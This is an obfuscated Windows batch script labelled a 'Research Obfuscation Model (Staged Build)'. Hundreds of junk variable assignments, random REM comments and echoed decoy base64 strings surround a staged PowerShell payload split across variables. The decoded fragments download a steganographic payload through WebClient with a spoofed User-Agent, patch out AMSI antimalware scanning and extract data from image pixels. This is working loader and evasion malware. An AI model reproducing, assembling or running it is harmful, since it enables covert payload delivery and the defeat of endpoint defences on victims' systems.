@echo off
set HaVpfwowGQQIln=
set HdIt=
set HemqQOnOz=
set HgEIl=
set HgsIYTbWZi=
set HhinGpzbGzAD=
set HiF=
set HmkclKlKtb=
set Hog=
set HpPUrjVgXRvQs=
set IBV=
set ICuR=
set IDbq=
set IIWiJjOMoFMGv=
set IJuamO=
set IKA=
set IQqp=
set IRWth=
set IUm=
set IjOY=
set IukcYDbWiXMo=
set Ius=
set IvP=
set JCCMjTHZpJ=
set JFTcd=
set JMFFi=
set JRs=
set JTTocBQysYHQ=
set JWHg=
set JiFck=
set JiTw=
set JjHHW=
set JjMc=
set JthPJMQCqxRC=
set Juk=
set JvG=
set JxpdvhYjN=
set JyUI=
set JzoTv=
set KGsLzbCmohafS=
set KKXLl=
set KNO=
set KRIwRKW=
set KRifUd=
set KZOkK=
set KZrvi=
set KfHQsUn=
set KnVhoofVc=
set KoP=
set LDNePuBAZ=
set LFFDCvTDUp=
set LHiNJV=
set LLM=
set LRLOSj=
set LXR=
set LZGMobRfpL=
set LcZVyHlDLfTULNV=
set LctD=
set LfaKevYcfQu=
set LgAz=
set LhKgD=
set LiG=
set LipvpuBlN=
set LryA=
set Lug=
set MBl=
set MBvC=
set MGZTM=
set MKNo=
set MKwMEs=
set MQjqM=
set MSY=
set MUpAe=
set MUpydkzNpkR=
set MVgIXpGQUFj=
set MaOoMMUk=
set MbIwQ=
set MblgkFrhb=
set MenmU=
set Mmi=
set MovbzHAN=
set MxLqR=
set NKKOlKiAjSWE=
set NKuagnAvL=
set NLNNnUo=
set NMWqJPkgy=
set NeD=
set NgPowlVv=
set Nmuyb=
set NnXRytkKTvbEAj=
set NoYKC=
set NogbH=
set NtawkHcYd=
set NuJWe=
set NyF=
set Nyw=
set OEubUw=
set OHvnWN=
set OINCYc=
set OPTc=
set ORY=
set OYhhlqPLKYKnS=
set OdBdYC=
set OeBDi=
set OiHcYiN=
set Old=
set OwSszpda=
set PBk=
set PBs=
set PGYv=
set PUKKJUNdIhkKLmT=
set PUku=
set PWiO=
set PchH=
set PdnZ=
set PhTb=
set Pib=
set PkvawPII=
set Pml=
set PnmTEfGOzyRnw=
set PoGEVSezwYmWg=
set PqYQ=
set PqfiEWyHXn=
set PvkP=
set PwLtLFkygQuP=
set QCGbU=
set QCedw=
set QJc=
set QRJDSJe=
set QRQ=
set QSNVZ=
set QYPQcswndyh=
set QZPvRV=
set QeNSNVwXNSzjW=
set QfkptqncN=
set QhLRmkPaFNhbcHk=
set QsBbOprK=
set QzU=
set RAKG=
set RLqqGVkK=
set RLslsRR=
set RPKdA=
set RPNpEhl=
set RPS=
set RRxbkgziLAAEWEC=
set RSAK=
set RahduFsPwRqm=
set RdCi=
set RfDZMDaIzEFoufD=
set RgZlMNKHeWpUwWR=
set RnhH=
set RsS=
set RtNOOxLMCPsFTV=
set RxSklZJIRliMW=
set SCg=
set SCiiV=
set SEPtqOdmZ=
set SMb=
set SOPC=
set SRkdkRwlIyAysax=
set STfUx=
set SfhMNzQamVxtXC=
set SgiR=
set Sie=
set SjyB=
set Sky=
set SrAnJUwtrtrVHC=
set SrwBsvlBmWCT=
set TCoL=
set TDwXuS=
set TIHIivGMgd=
set TKKNw=
set TQGFbYoGbaKxutn=
set TQnmIh=
set TVGDXQYA=
set TYot=
set ThL=
set TlR=
set TmAdw=
set TnmVzJnthWm=
set ToFjIJtyYxYgz=
set TpeK=
set TxNem=
set TyhVGBvwJMtaRV=
set UDBbC=
set UDU=
set UFbNWVxmA=
set UICVXgoUwFQIhR=
set UQKDeUCejlFHTu=
set UVjmbLLEdOVUMj=
set UWtji=
set UjPlSQssG=
set UlEf=
set UpC=
set UvNxEw=
set UvvytXw=
set UvzINPuu=
set UygixSewUMIOVT=
set VJM=
set VJh=
set VOPvv=
set VPPSk=
set VQG=
set VRapSoalZFM=
set VUFBqFCd=
set VVsfd=
set VevxAgosD=
set VgMafkjjjw=
set ViZPXrMFGjktncA=
set VjMzmEqSDt=
set VkbPUoUfeIJ=
set VzEZt=
set VzmwAEVUWyPiLnr=
set VznJfMOjhqzW=
set WAM=
set WAMq=
set WBbyvOnYW=
set WEnac=
set WGLRonbfviO=
set WGpfaQQIT=
set WLx=
set Wbv=
set Whky=
set WiznP=
set WrSMYmQre=
set WwiIo=
set WyJr=
set XCBPH=
set XIKB=
set XIPu=
set XPUehgObCrPGXmR=
set XeLmnFacygf=
set XiL=
set XoBUGdXgGE=
set XoZXYYpPrE=
set XsVbGkiqkUyQHe=
set XtGDv=
set XtYUXLnQxCmDlx=
set XvjdtQYT=
set XwIB=
set YBAosz=
set YByezcbPqyednG=
set YEWW=
set YIxwX=
set YLRmcwWcokRXCq=
set YNu=
set YkpH=
set YuyGgESDNMGBoC=
set YwVAhTorYeEHqCd=
set YwjKybQXRXYEru=
set ZBczPXpAAh=
set ZCDhrlHvbeKFa=
set ZFOOT=
set ZFyCOCfmZu=
set ZGVJS=
set ZJgbTSaVpACJ=
set ZNm=
set ZPGn=
set ZPPSEtHVEK=
set ZXyYv=
set ZYBtv=
set ZezyfxY=
set ZhCx=
set ZjdVTnthdAQwj=
set Zmrh=
set ZoQJ=
set Zzq=
set aCekUmBsfUOj=
set aDhsTw=
set aFNKvYM=
set aJu=
set aKgY=
set aQE=
set aQERghA=
set aRcWd=
set aUA=
set aXywMNn=
set aZAKWmSH=
set aev=
set ahOzXS=
set ahX=
set amcY=
set aqG=
set aqRY=
set aqXl=
set atlXncibL=
set ayG=
set azcAonxLFhHHa=
set bAKwRlNKRFcviP=
set bEZIvPOaXVpXHS=
set bGW=
set bHl=
set bLGKlnoHyDRIqFa=
set bOJG=
set bOJnGM=
set bPHwy=
set bTZUzhBibGC=
set bae=
set bhDaLbXWLhhn=
set bhNG=
set bhl=
set bjkIwUifdECdbNe=
set bndvTWeFgSqPu=
set bpHE=
set bqT=
set byEKZgVCxF=
set cIkS=
set cNBaG=
set cSks=
set cYFRuXzTkFC=
set cbaC=
set ccbV=
set ceUTnyt=
set cfE=
set cjZC=
set coT=
set coToU=
set cuYfWsA=
set cwVzyvGzLEVyFzp=
set dCu=
set dGrdugrItEBqZg=
set dIXWg=
set dJZnYssafpgkHiz=
set dKxHZUWbaVF=
set dQjoZvrni=
set dRxAx=
set dSAIYiAVRz=
set dUZP=
set dUwCJ=
set dkoQ=
set dkqV=
set dwjXPbcNXVIH=
set dyNpW=
set eLGaDlpGHEaPlet=
set eLoKv=
set eTjZOdWoQdif=
set eVYRrcudyzrFSA=
set eVfX=
set eXxzgCXkAAGsCT=
set ebD=
set ebUKKQipvZv=
set efgyzcSQYF=
set ekikRN=
set elyF=
set epigZ=
set eqzBl=
set erxTjsE=
set exiXXrl=
set fDdBnNJuqQchRh=
set fEX=
set fIOTKLTfQ=
set fIkznDCt=
set fJLis=
set fRJJ=
set famREM=
set fbOyHUtp=
set fcYucf=
set fci=
set fdRnIePWwGuBaM=
set ffUDcwmpfy=
set fhOvuDTOrHCrzt=
set fkBTtXdEFWxN=
set fnc=
set fnpq=
set foEEjXoVeX=
set fqGxW=
set frEnv=
set fuAeuGRbyBlHET=
set fwYQxU=
set fyDtTVOnw=
set gPRFr=
set gSwdWHouSDgssLo=
set gTOhAxQ=
set gTiJAKOuLNGizd=
set gYfPC=
set geuEk=
set ghWNT=
set glqFy=
set gnCyUIkN=
set grXO=
set gvlHL=
set hASTb=
set hBxcd=
set hCk=
set hDJMS=
set hGdLr=
set hHIl=
set hIScSRmYwLuacN=
set hKS=
set hLddcFBFkLFiYf=
set hRZD=
set hTUunvcDbGbNIcB=
set hZIGuTNNT=
set hbGlrjwWmtYb=
set hgUJifRKaShSZPm=
set hmJAUw=
set hxkmD=
set hyeNqTF=
set hzD=
set iALgehBcLmYudPp=
set iBOtdHzHholNF=
set iJQ=
set iOALvNGebrZC=
set iPUpz=
set iSCC=
set iWAgOSafKKkFnU=
set iYdT=
set idEs=
set innonGnXeFd=
set ioR=
set iput=
set iqkllGdO=
set isHIApWeEXek=
set isss=
set jCa=
set jEQ=
set jEpzNgUqDp=
set jLL=
set jNYhteYscQZxg=
set jQNXkIDhDITxJ=
set jRpnqtvjBlng=
set jUpQU=
set jVDXRkdSDD=
set jWKofjRYbuixnR=
set jgnAL=
set jqZcTIBld=
set jyWGKDVKCjnHw=
set jzLtX=
set kAaH=
set kBMqZKVSmjQI=
set kEenzI=
set kFZugQEOzJVK=
set kHydhS=
set kIBePlwcIob=
set kJFBOfU=
set kJxD=
set kOvKiPhxE=
set kRYNVLGK=
set kSyzJ=
set kfurVnxd=
set kgpy=
set kkw=
set knPPpCBZCqQir=
set kpdoqwMVfukbAQI=
set kpglmQACbZPBeDm=
set kqotl=
set ksE=
set ksUpvHHmhfP=
set kyxU=
set lCCg=
set lImdz=
set lUXdbDWcTZYyJDc=
set lWqo=
set lZEaXWz=
set lZbSnpqNMKNCBt=
set lbOp=
set lfmm=
set lhUr=
set lmAc=
set lnAXA=
set lotT=
set lpRIOO=
set lpWC=
set lrsTP=
set lsYh=
set lwRUQ=
set lyAMkEvPnolWOIh=
set mMZErIGyCvegRBY=
set mQjMzSB=
set mSZ=
set mSxdYTl=
set mYlGi=
set mjEkluCaYQ=
set mjWEn=
set mnu=
set mwBkF=
set nCp=
set nJmYlqLwzBBe=
set nLmyD=
set nPs=
set nVGO=
set nbjZN=
set ncU=
set nlF=
set nmJ=
set nngRVt=
set nnkwC=
set nwLqJNnya=
set oGxvlD=
set oJF=
set oLrwcMSYVWziMy=
set oLxrkGwFGG=
set oXKWrneeEgVgS=
set oZeKHRGiLUH=
set oamWJ=
set ofxMl=
set oqVRltbJIsdsni=
set otLCkDkoIOC=
set otcpXUrHVOMNYQ=
set otdmzmJVQv=
set ovPBOREyZtNzpxQ=
set ovc=
set ovwu=
set oxXtQvHbjtjtkEd=
set oxopwruaO=
set pDXg=
set pKdhIkV=
set pOl=
set pPhLQmsYkTI=
set pTdiDHwgVHqZ=
set pTt=
set pXahMITZloGXT=
set pYMa=
set pYjk=
set pZhS=
set pabUU=
set pfs=
set piyf=
set pkCSGwr=
set pk_TBVX_0000=
set pk_TBVX_0001=
set pk_TBVX_0002=
set pk_TBVX_0003=
set pk_TBVX_0004=
set pk_TBVX_0005=
set pk_TBVX_0006=
set pk_TBVX_0007=
set pk_TBVX_0008=
set pk_TBVX_0009=
set pk_TBVX_0010=
set pk_TBVX_0011=
set pk_TBVX_0012=
set pk_TBVX_0013=
set pk_TBVX_0014=
set pk_TBVX_0015=
set pk_TBVX_0016=
set pk_TBVX_0017=
set pk_TBVX_0018=
set pk_TBVX_0019=
set pk_TBVX_0020=
set pk_TBVX_0021=
set pk_TBVX_0022=
set pk_TBVX_0023=
set pk_TBVX_0024=
set pk_TBVX_0025=
set pk_TBVX_0026=
set pk_TBVX_0027=
set pk_TBVX_0028=
set pk_TBVX_0029=
set pk_TBVX_0030=
set pk_TBVX_0031=
set pk_TBVX_0032=
set pk_TBVX_0033=
set pk_TBVX_0034=
set pk_TBVX_0035=
set pk_TBVX_0036=
set pk_TBVX_0037=
set pk_TBVX_0038=
set pk_TBVX_0039=
set pk_TBVX_0040=
set pk_TBVX_0041=
set pk_TBVX_0042=
set pk_TBVX_0043=
set pk_TBVX_0044=
set pk_TBVX_0045=
set pk_TBVX_0046=
set pk_TBVX_0047=
set pk_TBVX_0048=
set pkaXAfWxL=
set pnqqJslAyS=
set puqcgqDQbfRx=
set pvHkYMW=
set pzjGn=
set pzlspatOMPrEm=
set qACXOVFChlos=
set qAGpibgTs=
set qAICc=
set qOFEFukLRhDyoCA=
set qPLbp=
set qPreh=
set qULdvlvxY=
set qUzoRhhbamdtw=
set qXmcu=
set qdJV=
set qdMmg=
set qgryqpAfzMi=
set qpJoQ=
set qrvOc=
set qvklluizn=
set rGgxwsoebchUFE=
set rJOMF=
set rKIqgsGmkZDWJTM=
set rOnbScbqp=
set rfCu=
set rhFA=
set rjJ=
set roEhwAin=
set rrZuxZApqltTU=
set ruxcFYcHDXA=
set rxbBs=
set rzIPwcQbqZ=
set rzuMlFfH=
set sBSyJ=
set sDZbpXHDLPJONV=
set sDlNnSiwkZEDOz=
set sJLaj=
set sLQl=
set sMioc=
set sUALQ=
set sXCB=
set sbmSwBdxLTQ=
set skV=
set sodP=
set spS=
set swmyq=
set syd=
set syp=
set tCuxhHwTGL=
set tDfAeBNQkGya=
set tDwX=
set tJk=
set tLHdKsDBytmJDW=
set tQJ=
set tRUo=
set tRhYl=
set tZP=
set tZuE=
set ttHx=
set ttJNEsRrPrp=
set ttXEwmFLiVSR=
set uJn=
set uKiRSKOLNYLT=
set uMoa=
set uNLtTtn=
set uWFNGq=
set uaRucfyH=
set ufOiSOWIJ=
set ufh=
set ujleKZn=
set urDwnsHN=
set urHYouFGV=
set uygkOWHMGEvdP=
set vBojRBOlzaqjEkU=
set vMuWvRsaiVP=
set vVsf=
set vdflf=
set vhY=
set vswYp=
set wBMg=
set wBz=
set wOAXV=
set wPFStHNvrWmKEy=
set wQNlnseWYG=
set wYxE=
set wZfbR=
set wZljDt=
set wbC=
set wuC=
set wvBxI=
set wxqKdjCllu=
set xFLyakxbWfUfzyC=
set xIRA=
set xJra=
set xPT=
set xRin=
set xTZr=
set xZDmbZKWSqys=
set xcAlbErLhLeh=
set xpwm=
set xqGzBAOeFJgFnsf=
set xrd=
set xuKExdfnlBbt=
set xursDYySNKIE=
set yLq=
set yMD=
set yNtkur=
set yOJ=
set yTY=
set yUNr=
set yWqBxVFWAjv=
set ybYpodav=
set ybZu=
set ydhndlzlaTaiB=
set yoZ=
set yopCm=
set ysTTiELYZgNDZu=
set ysmvKOWlolpu=
set ywwHWcAUXqVRtQ=
set zBgUP=
set zDpd=
set zFSzBbxjxvBUgKN=
set zJdiDq=
set zLTHY=
set zMfHEx=
set zOg=
set zXwvUqjBdF=
set zZUjxirMEcsHB=
set zfjNdkJazJCmPD=
set zwLPxdHEdYXbPLy=
set zykk=

REM --- Research Obfuscation Model (Staged Build) ---
REM circle phantom vision kiln valley glimmer pixel
echo d1NQNUxrM0FEU1hKUXFZRWV2Sk1MaE5NNmNJdm9oMjhES3dZYU13a1pUUFo3YlJ0anYwYXhCVHlTZ1RZWUx1bG5GMWFpQWs= >nul 2>&1
REM echo kiln vision vision echo ruby echo vertex kiln delta
REM mirage fragment cipher shadow fragment hawk twilight kappa fragment
Se%Whky%t "YwVAhTorYeEHqCd=zvYZqBAXxkGLtKyPkuNFBEAnmUWNqiTG"
REM sword pixel fragment binary
se%ZGVJS%t "BQATGIjgSUJvK=NWDiwptsIMOFEZZjJ"
echo V1QzNkhTMlZ0NjQ1dlNZMjF2ZVdNRUphenNmcUFQSXRDTlpETTRDajA4dG1YZTJzemdkRVp5UktKU0JGYVk= >nul 2>&1
REM binary undergrowth fragment twilight hawk mirage
sE%XiL%T "pzlspatOMPrEm=pNtexIOseyuWxKhy"
REM fragment sword fragment shadow shadow hawk vision mirage mirage
echo VGNzRzNoZ3FEVTVoYWhITlh2NXVUTGlRMVVuYWJaQm9FbUhnRjRwc3k5NlBRcGZlbllIRVdqMA== >nul 2>&1
se%JzoTv%t "IIWiJjOMoFMGv=uVvZzmQskQaWJtMoVQZvbyvRxajIxfG"
se%bPHwy%T "fwYQxU=vUiyOJmbslHWI"
REM echo twilight odyssey valley core valley phantom
REM vertex zenith sword vertex guard circle undergrowth
REM hawk fragment ruby kiln circle sword twilight phantom vertex shadow
se%bGW%T "eLGaDlpGHEaPlet=MFfLNduvFvmJsSJqqqMaqntjM"
REM valley kappa shadow beacon cipher valley
echo cEp1Nk5WZWZTb2M1d0xhNVF0bmU5Y254S1ZJR2VMaGF3SU02ZDdzcFEyblJSSnFEU0NFY3M2 >nul 2>&1
echo M2dsdHpnVWttYkU2Mk1VUE1GcmpjYldRb3o2SWJpRHJIYmlUZTJJVXVtVzkxdWxLV1JJU0RPWg== >nul 2>&1
echo ektpUHRRaU1jc2ZDNURrS2tDakNjcUVXR2xsVFpjNHRnaUFkRm9FcTk2Q2hWalZw >nul 2>&1
REM delta beacon ruby pixel
echo Yk5yeWRXYWJGWDgzc2lBY21kZHhqOVVEazlFTGl0ZnFSam9KbE53cjNS >nul 2>&1
echo djNPa2tGN2FtRklaaGI4a2FJRzdWQTJzbjFOdGdVeFMxUjd0M0h6d0h4Qk9Gb29nMGpIOTZCWDBoajNDSEU2bURvV2lqZWlUeVg= >nul 2>&1
REM zenith delta ruby lance sword echo kiln pixel lance
REM shadow vertex circle guard echo odyssey zenith delta vertex clearing
REM delta vertex zenith binary valley hawk guard vision delta lance
Se%Fxft%t "oqVRltbJIsdsni=gHxCcRXqOjybbFNrRohNlibtwVn"
SE%bHl%t "WGpfaQQIT=IlDRHcGjsCJsNbYyCiaaIjq"
REM cipher hawk guard delta lance
sE%Cxpa%t "jWKofjRYbuixnR=tVeyiMwNrfVQVNHgthh"
echo ek82dlczR2pQT2VrZmNpaENIZmVBbjJCSFhzN1FhbzJLbVpIc0V1bVVTNQ== >nul 2>&1
se%pTt%t "ovPBOREyZtNzpxQ=XcdbMROUOXnCJvIECyCn"
SE%JFTcd%t "famREM=bSaYBMBudgQivXGB"
REM twilight sword fragment hawk ruby valley twilight ruby pixel shadow
SE%swmyq%T "dwjXPbcNXVIH=SCFZqMHvSNWfgYyQfk"
REM ruby hawk zenith core lance lance kappa fathom
sE%LLM%T "dGrdugrItEBqZg=rjOYQodXMRomgTJYFqBMuelbuZVYtVAK"
REM ruby pixel beacon pixel valley beacon fragment guard hawk sword
echo T2RrUjJuenREM2NpVXZZNWdIb0Y1OVBQVHZKYVJxVkRGdEVEcTlRcFdwcDRuaW1mMER0S1BBWXlTVVFqVk44MDhMMw== >nul 2>&1
sE%AmRD%T "KfHQsUn=IWBRcwXMplIsVCxuJmGQRKQXEDKOg"
se%spS%t "BmtUViLSj=wokKqwzdeiswIzehGRCIZMoZ"
sE%WiznP%t "foEEjXoVeX=jGIHWhdAdzrDnErhlmeOwxFxrNP"
Se%grXO%t "ksUpvHHmhfP=CqCjPrYhHZ"
REM echo shadow fragment
SE%yUNr%t "RLslsRR=chTHvfHHRyDysnZkOADtKJEF"
REM phantom core strobe phantom valley zenith pixel
echo ZW9Fcm53VzZlRGpOU2IyOXByNVM0MzYzSW5IQ2hqUE5RMUg2SGh2NnVPOGNGWnVvbzA2aFhYZDJy >nul 2>&1
echo QWt2STNibDNkOWh5c3RyeTVaV3BSaHc5ZWNneGt1ZlhyaEJEejZidjhaTXo2SnhDUA== >nul 2>&1
REM clearing valley glimmer mirage
REM kappa vertex kiln pixel vertex
REM binary echo strobe lance
REM kiln binary odyssey circle kiln fathom ruby
REM beacon shadow glimmer undergrowth kiln kappa beacon
REM core odyssey binary vertex vision odyssey
sE%PdnZ%T "jyWGKDVKCjnHw=BsKZhkpkqGieqRmyxAkchobVNOErS"
sE%wBz%t "tDfAeBNQkGya=lwEFWKsljNIqPnz"
se%bOJG%t "UygixSewUMIOVT=xUQrQtzFCfXwhJWeBNq"
echo UFhnMVVyVWF0YVhtem5TcFA4Tjh3ZGZKNWlTY2FhQVUySFlmNVZFR1VXQkwyaTJQQ0dZWEZDWHdzUWQ1aFFrU1B3T016MUZHcGtvUg== >nul 2>&1
echo VmtCbFNPMTBJem5pajF4dEYweld3R2daVUlabld0eDNjcndTM3MweXJT >nul 2>&1
echo dlpVWG5LaHNzS2l6a0pGWmlzZGNkUEIwQlhISjJFOEtzVGdGSVhxMUVIWlMybFdPMTg= >nul 2>&1
echo R2dUZ2k3OW9xUmRaNlBFdllGN3NiTldKWTBCdm5sRzdUMFJuWVowbEI5TmRqc2hXOWtHOTd3YlRCSjM3TDhHcDdSWFB5WGw= >nul 2>&1
SE%ybZu%T "IJuamO=HettsJXJhZaYTiLD"
REM phantom vision shadow phantom lance strobe
REM phantom hawk odyssey sword strobe beacon glimmer guard pixel
echo WWNza2g2RzlkQU5GVUZzNnJCMEthZU90Wml2VXRYTWlNOUhNQVRaNmZZV3pB >nul 2>&1
REM lance pixel echo phantom guard
SE%lpWC%t "EojVXmoFPAKmV=pFaCgawyLbeaFmdQMHlHYzpmjZibEgePEe"
REM delta strobe fragment hawk undergrowth vision
echo M3ltMjZkZ3lWdzNZR3dmcm1aYWlOWXpqRmc1M0tGeVdiaWdnbFZ3ZG0xUkJqaE9qTno2MzFRQVM= >nul 2>&1
REM glimmer pixel undergrowth
se%NyF%t "AMhjjUg=tHvdInDtZg"
sE%TpeK%t "DWXpSpYKZIKyFK=GJoHvkLjHAceLsSlwuNzctSb"
REM kiln kiln hawk phantom fathom odyssey core core valley
REM lance lance kappa undergrowth phantom fathom
REM shadow undergrowth fathom circle vertex phantom
REM fragment sword vertex valley
echo azlUYnd0U1IzTVRQOGw5Y004UlhvellhM0pPVkRqckt1bmpjRjlCMGg4YnZmWlM= >nul 2>&1
REM fragment phantom fragment kappa beacon echo fragment undergrowth strobe
REM zenith undergrowth strobe strobe phantom guard guard vision hawk
REM shadow echo strobe
REM fathom core echo clearing twilight strobe
REM zenith glimmer cipher cipher cipher zenith phantom fragment
REM undergrowth beacon vision
REM odyssey fathom vertex core
SE%BGRNj%T "vMuWvRsaiVP=reVXHBshGYpwkxKp"
sE%ttHx%T "MVgIXpGQUFj=MZAPGtNNfeYZBKo"
echo UE5nS3VHeHk4anNjNHQwU2tJOUhXeG9VRDhPT1dFRWpCQlNHVFZzUWVKb1l2cFFjOUt5dXVmMzZ2bDdsU0ZzbTRKMFNX >nul 2>&1
echo bXJ2dEhKTW0zdHBzb0VPOVlVaFc3aUJKZW5iTmFPcGVRSFVDWVcwejYxU0lo >nul 2>&1
echo VFJZcVBzZk0wU2o4VWcwdndQcGVCbXlRTjdrR0dqVEVyNzRjRDB0V0JtNzNRVnk3aDFFamx2WlI= >nul 2>&1
sE%HEpf%t "pk_TBVX_0029=vd25sb2FkaW5nIHN0ZWdvLi4uIgokd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiR3Yy5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXa"
SE%TlR%T "BwmegyFnTW=FrykjrQhjBdn"
echo R1Y1c3NBMFRGdTg4V28zVGxmU01iMzlRcWZ1UDR4ODcycjJXRUxERm5CeWJiYTY0dzFFNUdXb0NUQ2FxbzdISFFP >nul 2>&1
Se%DZm%T "UQKDeUCejlFHTu=rEuWJlDFREWbw"
echo ZkhPZVF6Y2lqaUdUTFFISE5UeFJhd1BDSzNTWmVaNHY5Y3dTQVdXM1p4V2FwcG5YZ0pDeWt3NEpib3UxUFpUam9qcHNIYkJtVE45M05OMA== >nul 2>&1
Se%zykk%T "NKuagnAvL=JTHNHIueJXiuHlSdwRipyjCgDemAJk"
REM vertex kappa phantom echo valley kiln vertex sword core
SE%FSj%T "NKKOlKiAjSWE=gNPSmbRRWTpWdpWPPwRzuBSRJtRHjRXf"
se%BXLo%t "XoZXYYpPrE=cAeDgfkHRARZYrZad"
sE%hRZD%T "BnRdjTkJ=klpfhFgntlwJZTvkNAQFObHTswFKz"
REM hawk ruby odyssey cipher fathom sword fragment
echo VUNxcm1yVldmTWZUS1cyTUM1VWNjc1BzMVAzdkxlRGtLeGVYcVpxNm5wS2d4bTN1ZWRIaDVaQ0V5Vjh5a091cE4yb3JxQXg0ZDZncDBTdA== >nul 2>&1
echo d1EyaFlrTVp5Mkczc3o1U1o1TVlHelV5SWwza1dQTkxyeEZqWnhNbm13TG81cWUyY3U= >nul 2>&1
REM strobe core fragment valley zenith binary vision circle mirage
REM valley fragment kappa zenith kiln pixel kiln fathom core valley
echo ZTR2WGd2OXlaNXlIcko3Z2twbG5xQUdlUVYwWFR3cDRPR3ZvbGdZS0YxOWZtQURxZGFWZU5zSUhvNEd6R2VuVFNPc01sT25CdVNmbXQ= >nul 2>&1
se%lImdz%t "vBojRBOlzaqjEkU=EFWPXeoudFTTOZRFKCfmlF"
REM circle vision fathom vision fragment
SE%fci%t "kpdoqwMVfukbAQI=KsyIokWECAaISDWKcEbNLKgzurOmGub"
Se%MQjqM%t "pk_TBVX_0010=zaS5kbGwiKQppZiAoJGhBbXNpIC1lcSBbSW50UHRyXTo6WmVybykgewpMb2ctU2lsZW50ICJbKl0gR2hvc3QgUGF0Y2ggc2tpcHBlZDogYW1zaS5kbGwgbm90IGluIHByb2Nlc3MuIiAiR3JheSIKc"
REM cipher kiln hawk odyssey
sE%bae%t "EUSwECB=UAQXcCaegCUoWmCKqgDSCR"
echo ek1mQ3lzdDBZbkdzcWxPN01SNUJaUE1iYzlublgzTjVnQVU2eWRIN1F0TDV6UTJZNmJZcHJBanBPMUVWR3lJYkdRckU= >nul 2>&1
se%KZrvi%T "RPNpEhl=iEDYDihLLYVBJWxMStVooqdgRvIRvVowO"
SE%Ius%T "pk_TBVX_0035=gJGg7ICR5KyspIHsKZm9yICgkeCA9IDA7ICR4IC1sdCAkdzsgJHgrKykgewppZiAoJHkgLWVxIDAgLWFuZCAoJHggLWVxIDAgLW9yICR4IC1lcSAxKSkgeyBjb250aW51ZSB9CiRweCA9"
REM vertex lance valley core phantom zenith
se%ARjEi%t "aQERghA=PgMExdFTcqFVaQoXQhO"
REM twilight sword kiln clearing guard mirage strobe kiln valley glimmer
